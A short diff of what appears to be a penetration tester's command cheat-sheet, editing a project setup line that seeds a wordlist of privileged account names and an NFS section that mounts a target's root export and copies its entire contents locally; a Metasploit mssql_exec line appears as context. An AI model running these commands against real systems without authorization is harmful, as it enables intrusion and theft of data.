@@ -1,6 +1,6 @@
 # Setup
 ## New Project
-mkdir -p ~/Projects/"$TARGET"; cd ~/Projects/"$TARGET"; echo "cd $PWD" >> ~/.zshrc; touch usernames passwords; echo "\nadministrator\nguest\nkrbtgt\ndomain admins\nroot\nbin\nnone" > usernames; echo "\n" > passwords; tmux list-windows -F '#{window_id}' | xargs -I {} tmux list-panes -t {} -F '#{pane_id}' | while read pane_id; do tmux send-keys -t $pane_id 'source ~/.zshrc' C-m; tmux send-keys -t $pane_id C-l; done; sudo -v
+PROJECT="$HOME/Projects/$TARGET"; mkdir -p "$PROJECT"; cd "$PROJECT"; echo "cd $PWD" >> ~/.zshrc; touch usernames passwords; echo "\nadministrator\nguest\nkrbtgt\ndomain admins\nroot\nbin\nnone" > usernames; echo "\n" > passwords; tmux list-windows -F '#{window_id}' | xargs -I {} tmux list-panes -t {} -F '#{pane_id}' | while read pane_id; do tmux send-keys -t $pane_id 'source ~/.zshrc' C-m; tmux send-keys -t $pane_id C-l; done; sudo -v
 
 ## Configuring Adapter
 vmware
@@ -622,12 +622,12 @@ msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set 
 sessions -i 1
 
 [*] (2049) NFS
-showmount -e $TARGET
-mkdir nfs 2>/dev/null
+mkdir nfs 2>/dev/null; showmount -e $TARGET
 sudo mount -t nfs "$TARGET":"/" "./nfs" -o nolock
 sudo umount --lazy "./nfs"
 rm -rf "./nfs"
-tree -puga "./nfs/folder"
+sudo tree -puga "./nfs/"
+sudo cp -r ./nfs/. .
 
 sudo open file.txt
 sudo open file.png
